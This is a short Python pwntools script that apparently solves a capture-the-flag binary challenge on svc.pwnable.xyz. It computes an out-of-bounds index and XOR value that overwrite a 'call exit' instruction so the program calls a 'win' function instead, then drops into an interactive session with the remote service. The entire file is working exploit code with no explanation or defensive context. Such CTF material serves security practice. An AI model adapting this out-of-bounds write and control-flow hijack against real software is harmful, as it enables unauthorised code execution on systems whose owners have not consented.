from pwn import *
from Crypto.Util.number import bytes_to_long

e = ELF("./challenge")

patch_addr = 0xac8	# location of  call exit
win_addr = 0xa21
result_addr = 0x202200

e.asm(patch_addr, "call 0x%x"%win_addr)

inst = e.read(patch_addr, 5)
print(inst)
print(inst[::-1])
inst = bytes_to_long(inst[::-1])	#change endian

print(inst)
index = (patch_addr - result_addr) / 8

#r = process("./challenge")
r = remote("svc.pwnable.xyz", 30029)

r.sendlineafter("   ", "%d %d %d"%(1, inst ^ 1, index))
r.sendlineafter("   ", "a")			#exit loop

r.interactive()

r.close()
